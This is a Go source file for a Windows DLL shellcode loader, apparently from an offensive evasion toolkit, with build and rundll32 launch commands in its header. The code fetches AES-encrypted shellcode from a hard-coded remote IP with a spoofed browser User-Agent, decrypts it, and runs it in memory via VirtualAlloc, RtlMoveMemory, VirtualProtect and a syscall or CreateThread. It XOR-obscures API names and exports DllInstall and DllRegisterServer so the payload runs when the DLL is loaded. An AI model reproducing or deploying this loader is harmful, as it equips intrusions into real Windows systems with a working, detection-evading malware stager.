/*
Author: hxhBrofessor

PS C:\Users\test\Documents\Demo\Pochita-main\Template\2-DLL> go build -ldflags="-s -w -extldflags -static" -buildmode=c-shared -o myMerp.dll dll.go
PS C:\Users\test\Documents\Demo\Pochita-main\Template\2-DLL> rundll32.exe .\myMerp.dll,Wutang
*/

package main



import (
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	ps "github.com/mitchellh/go-ps"
	"golang.org/x/sys/windows"
	"io/ioutil"
	"log"
	"net/http"
	"syscall"
	"unsafe"
)

import "C"

func main() {
	getFile()
	decryptShellcode()
	method1_SysCall_XOR(clearShellcode)
}

//export Wutang
func Wutang() {
	main()
}

//export EntryPoint
func EntryPoint() bool {
	return true
}

//export DllRegisterServer
func DllRegisterServer() bool {
	return true
}

//export DllUnregisterServer
func DllUnregisterServer() bool {
	return true
}

//export DllInstall
func DllInstall() bool {
	main()
	return true
}

const myKey = byte(0x01)

var shellcode []byte
var clearShellcode []byte

// encrypted
var (
	kdog  = xorEncrypt([]byte("kernel32.dll"), myKey)  //kernel32=kdog
	RTLMM = xorEncrypt([]byte("RtlMoveMemory"), myKey) //RtlMoveMemory=RTLMM
	CT    = xorEncrypt([]byte("CreateThread"), myKey)  //CreateThread=CT
	EP    = xorEncrypt([]byte("ExitProcess"), myKey)   //ExitProcess=EP
)

func getFile() {
	// Create HTTP client with custom headers
	client := &http.Client{}
	req, err := http.NewRequest("GET", "http://192.168.153.145:9090/enc_demo_calc.bin", nil)
	if err != nil {
		panic(err)
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36")
	req.Header.Set("Accept-Encoding", "gzip, deflate")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()

	// Read response body into byte array
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}

	shellcode = body
}

func decryptShellcode() {
	// Creating key
	key := []byte("xL3gGa4RM$S@LsSY")

	// Creating block of algorithm
	block, err := aes.NewCipher(key)
	if err != nil {
		log.Fatalf("Error creating cipher block: %v", err)
	}

	// Creating GCM mode
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		log.Fatalf("Error creating GCM: %v", err)
	}

	// Deattached nonce and decrypt
	nonce := shellcode[:gcm.NonceSize()]
	cipherText := shellcode[gcm.NonceSize():]
	clearShellcode, err = gcm.Open(nil, nonce, cipherText, nil)
	if err != nil {
		log.Fatalf("Error decrypting shellcode: %v", err)
	}
}
func xorEncrypt(data []byte, key byte) []byte {
	for i := 0; i < len(data); i++ {
		data[i] = data[i] ^ key
	}
	return data
}

func xorDecrypt(data []byte, key byte) []byte {
	for i := 0; i < len(data); i++ {
		data[i] = data[i] ^ key
	}
	return data
}

func findProcess(proc string) int {
	processList, err := ps.Processes()
	if err != nil {
		return -1
	}

	for x := range processList {
		var process ps.Process
		process = processList[x]
		if process.Executable() != proc {
			continue
		}
		p, errOpenProcess := windows.OpenProcess(
			windows.PROCESS_VM_OPERATION, false, uint32(process.Pid()))
		if errOpenProcess != nil {
			continue
		}
		windows.CloseHandle(p)
		return process.Pid()
	}
	return 0
}

func method1_SysCall_XOR(sc []byte) {
	/*
		key := byte(0x01)
		//Encrypt with XOR
		kernel32 := xorEncrypt([]byte("kernel32.dll"), key)
		RtlMoveMemory := xorEncrypt([]byte("RtlMoveMemory"), key)
	*/

	//Decrypt
	kdog := windows.NewLazyDLL(string(xorDecrypt(kdog, myKey)))
	RTLMM := kdog.NewProc(string(xorDecrypt(RTLMM, myKey)))

	addr, err := windows.VirtualAlloc(uintptr(0), uintptr(len(sc)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		panic(fmt.Sprintf("[!] VirtualAlloc(): %s", err.Error()))
	}
	RTLMM.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
	var oldProtect uint32
	err = windows.VirtualProtect(addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READWRITE, &oldProtect)
	if err != nil {
		panic(fmt.Sprintf("[!] VirtualProtect(): %s", err.Error()))
	}

	syscall.SyscallN(addr, 0, 0, 0, 0)
}

func method2_CreateThreadXOR(sc []byte) {
	/*
		key := byte(0x01)
		//Encrypt with XOR
		kernel32 := windows.NewLazySystemDLL("kernel32.dll")
		kernel32 := xorEncrypt([]byte("kernel32.dll"), key)
		RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
		RtlMoveMemory := xorEncrypt([]byte("RtlMoveMemory"), myKey)
		CreateThread := kernel32.NewProc("CreateThread")
		CreateThread := xorEncrypt([]byte("CreateThread"), key)
	*/

	//Decrypted
	kdog := windows.NewLazyDLL(string(xorDecrypt(kdog, myKey)))
	RTLMM := kdog.NewProc(string(xorDecrypt(RTLMM, myKey)))
	CT := kdog.NewProc(string(xorDecrypt(CT, myKey)))
	ExitProcessProc := kdog.NewProc(string(xorDecrypt(EP, myKey)))

	addr, err := windows.VirtualAlloc(uintptr(0), uintptr(len(sc)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		panic(fmt.Sprintf("[!] VirtualAlloc(): %s", err.Error()))
	}
	RTLMM.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), (uintptr)(len(sc)))
	var oldProtect uint32
	err = windows.VirtualProtect(addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READ, &oldProtect)
	if err != nil {
		panic(fmt.Sprintf("[!] VirtualProtect(): %s", err.Error()))
	}
	thread, _, err := CT.Call(0, 0, addr, uintptr(0), 0, 0)
	if err.Error() != "The operation completed successfully." {
		panic(fmt.Sprintf("[!] CreateThread(): %s", err.Error()))
	}
	_, _ = windows.WaitForSingleObject(windows.Handle(thread), 0xFFFFFFFF)
	ExitProcessProc.Call(0)
}
